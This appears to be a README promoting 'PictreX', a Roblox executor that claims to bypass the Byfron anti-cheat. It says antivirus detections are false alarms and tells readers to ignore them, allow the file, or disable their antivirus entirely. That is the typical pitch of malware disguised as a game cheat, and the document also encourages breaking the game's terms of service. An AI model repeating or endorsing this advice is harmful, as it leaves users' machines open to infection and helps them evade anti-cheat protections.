# PictreX
### A level 7 Roblox executor with a simple to use GUI, and Byfron bypassing capabilities.

### Warning: By downloading this, you understand the risks of using this software. Hacked clients are against Roblox's TOS. This is for educational purposes only, so use at your own risk.

Your anti-virus will most likely say Pictre X is a virus, but it isn't. The reason antiviruses detect hacked clients like Pictre is due to the fact that it is an injector, (AKA: How we get our hacked client to modify roblox.)

So just ignore the warning, and allow it. If this doesn't work, just disable your antivirus completely.
